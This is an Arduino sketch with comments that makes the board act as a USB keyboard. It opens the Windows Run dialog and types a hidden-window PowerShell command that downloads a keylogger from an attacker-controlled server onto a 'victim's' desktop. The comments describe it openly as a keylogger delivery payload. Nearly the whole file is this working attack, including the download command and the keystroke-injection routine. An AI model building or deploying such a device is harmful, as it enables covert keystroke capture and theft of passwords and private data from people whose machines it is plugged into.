
// This code is intended to turn the Arduino into a USB keyboard using HIDKeyboard. 
// It simulates a series of keystrokes to download a keylogger (Python script) onto a victim's desktop using PowerShell.

// Libraries and Definitions:
// - The HIDKeyboard library is included to enable the Arduino to function as a keyboard.
// - Several key codes are defined, such as CTRL, SHIFT, ALT, function keys (F1-F12), and arrow keys for simulating keyboard input.

// Global Variables:
// - 'keyboard' is the HIDKeyboard object that allows the Arduino to send keyboard inputs to the computer.
// - 'buf[]' is an 8-byte array used to store keypresses before they are sent to the computer as a report buffer.

// setup():
// - Starts keyboard communication by calling 'keyboard.begin()'.
// - After a short delay, it simulates the keypress for the Windows key and 'R' (GUI + R), which opens the Run dialog on a Windows machine.
// - It then types a PowerShell command that downloads a keylogger from an external server and saves it to the victim's desktop.
//   Specifically, the command is: 
//   "powershell -w hidden *IEX(New-Object Net.WebClient).DownloadFile('http://you_ip/keylogger.py', 'C:/Users/Victim/Desktop/keylogger.py')*"
//   This command is designed to run PowerShell in a hidden window and download the malicious Python script (keylogger).
// - After typing the PowerShell command, it presses the ENTER key to execute it.

// loop():
// - The loop function is empty, as all of the payload execution happens in the 'setup()' function.

// STRING(char *txt):
// - This function sends a string of characters to the computer, converting each character into its corresponding keycode.
// - It handles different cases such as lowercase letters, uppercase letters (with SHIFT), numbers, and special characters.
// - It simulates the typing of the PowerShell command by converting the string to keystrokes, including handling special symbols like slashes, underscores, and dollar signs.
// - Each keypress is sent using 'Serial.write()', mimicking the typing behavior of a keyboard.

// Purpose and Action:
// - The goal of this code is to automate the process of downloading and executing a keylogger on a victim's machine.
// - It uses PowerShell to download the Python script from an attacker's server and places it on the desktop for execution, making it a basic keylogger delivery payload.

#include <HIDKeyboard.h>

#define KEY_LEFT_CTRL   0x01
#define KEY_LEFT_SHIFT  0x02
#define KEY_LEFT_ALT    0x04
#define KEY_LEFT_GUI    0x08
#define KEY_RIGHT_CTRL  0x10
#define KEY_RIGHT_SHIFT 0x20
#define KEY_RIGHT_ALT   0x40
#define KEY_RIGHT_GUI   0x80
#define KEY_RIGHT_ARROW 0x4F
#define KEY_LEFT_ARROW  0x50
#define KEY_DOWN_ARROW  0x51
#define KEY_UP_ARROW    0x52
#define KEY_ESC         0x29T
#define KEY_F1          0x3A
#define KEY_F2          0x3B
#define KEY_F3          0x3C
#define KEY_F4          0x3D
#define KEY_F5          0x3E
#define KEY_F6          0x3F
#define KEY_F7          0x40
#define KEY_F8          0x41
#define KEY_F9          0x42
#define KEY_F10         0x43
#define KEY_F11         0x44
#define KEY_F12         0x45
#define KEY_PRTSCR      0x46
#define KEY_SCRLK       0x47
#define KEY_PAUSE       0x48
#define KEY_DEL         0x4C
#define KEY_INS         0x49
#define KEY_END         0x4D
#define KEY_HOME        0x4A
#define KEY_PGDN        0x4E
#define KEY_PGUP        0x4B
#define KEY_BACKSPC     0x2A
#define KEY_TAB         0x2B
#define KEY_ENTER       0x28
#define KEY_SPC         0x2C
#define KEY_MUTE        0x7F
#define KEY_VOL_UP      0x80
#define KEY_VOL_DOWN    0x81
#define KEY_UNDERLINE   0x2D
#define KEY_PLUS        0x2E
#define KEY_NONE 0x37
#define KEY_R 0x15
#define KEY_4 0x21



HIDKeyboard keyboard; // Inicializa el objeto HIDKeyboard

uint8_t buf[8] = { 0 }; /* Keyboard report buffer */ 

void setup() {

keyboard.begin(); // Start communication

    Serial.write(buf, 8);
    
delay(1500);


 buf[0] = GUI;
 buf[2] = KEY_R;

    Serial.write(buf, 8);       // Send keypress
    buf[0] = 0;
    buf[2] = 0;
    Serial.write(buf, 8);
    
delay(300);

STRING("powershell -w hidden *IEX(New-Object Net.WebClient).DownloadFile(\\http;//you_ip/keylogger.py\\, \\C;/Users/Victim/Desktop/keylogger.py\\)*");
//powershell -w hidden "(New-Object Net.WebClient).DownloadFile('http://your_ip/hola.py', '$env:USERPROFILE\Desktop\hola.py')"

delay(700);
keyboard.pressSpecialKey(ENTER); //
keyboard.releaseKey();

}

void loop() {

}

void STRING(char *txt) {
    while (*txt) {


      
      if (*txt >= 'a' && *txt <= 'z') {
        buf[2] = *txt - 'a' + 4;
      }
      else if (*txt >= 'A' && *txt <= 'Z') {
        buf[0] = KEY_LEFT_SHIFT;

        buf[2] = *txt - 'A' + 4;
      }
      else if (*txt >= '0' && *txt <= '9') {
        if (*txt == '0') {
          buf[2] = *txt - 9;
        }
        else {
          buf[2] = *txt - 19;
        }
      }
      else if (*txt == ' ') {
        buf[2] = KEY_SPC;
      }
      else if (*txt == '&') {
        buf[0] = KEY_LEFT_SHIFT;
        buf[2] = 0x24;
      }
      else if (*txt == '>') {
        buf[0] = KEY_LEFT_SHIFT;
        buf[2] = KEY_NONE;
      }
      else if (*txt == '<') {
        buf[0] = KEY_LEFT_SHIFT;
        buf[2] = 0x36;
      }
      else if (*txt == '|') {
        buf[0] = KEY_LEFT_SHIFT;
        buf[2] = 0x64;
      }
      /*
      else if (*txt == '/') {
        buf[0] = KEY_RIGHT_ALT;
        buf[2] = 0x14;
      */
      else if (*txt == '\\') {
        buf[2] = 0x34;
      }
      
      else if (*txt == '*') {
        buf[0] = KEY_LEFT_SHIFT; 
        buf[2] = 0x34;
      }
      else if (*txt == ';') {
        buf[0] = KEY_LEFT_SHIFT; 
        buf[2] = 0x33;
      }
      else if (*txt == '(') {
        buf[0] = KEY_LEFT_SHIFT;
        buf[2] = 0x26;
      }
      else if (*txt == ')') {
        buf[0] = KEY_LEFT_SHIFT;
        buf[2] = 0x27;
      }
      else if (*txt == '{') {
        buf[0] = KEY_RIGHT_ALT;
        buf[2] = 0x24;
      }
      else if (*txt == '}') {
        buf[2] = 0x27;
      }
      else if (*txt == '[') {
        buf[0] = KEY_RIGHT_ALT;
        buf[2] = 0x25;
      }
      else if (*txt == ']') {
        buf[0] = KEY_RIGHT_ALT;
        buf[2] = 0x26;
      }
      else if (*txt == '-') {
        buf[2] = 0x2D;
      }
      else if (*txt == '=') {
        buf[2] = 0x2E;
      }
      else if (*txt == '.') {
        buf[2] = 0x37;
      }
      else if (*txt == '/') {
       // buf[2] = 0x36;
       buf[2] = 0x38;
      } else if (*txt == ',') {
       buf[2] = 0x36;
      }
      else if (*txt == '_') {
        buf[0] = KEY_LEFT_SHIFT;
        buf[2] = KEY_UNDERLINE;
      }
      else if (*txt == '+') {
        buf[0] = KEY_LEFT_SHIFT;
        buf[2] = KEY_PLUS;
      }
      else if (*txt == '4') {
       buf[0] = 0x36;
      }
      else if (*txt == '$') {
       buf[0] = KEY_LEFT_SHIFT;
       buf[2] = KEY_4;
      }
       else if (*txt == ':') {
       buf[0] = 0x33;
      }
      else {
        buf[0] = KEY_LEFT_SHIFT;
        buf[2] = KEY_PLUS;      
        }

      Serial.write(buf, 8);   // Send keypress
      buf[0] = 0;
      buf[2] = 0;
      Serial.write(buf, 8);   // Release key
      txt++;
    }
  }
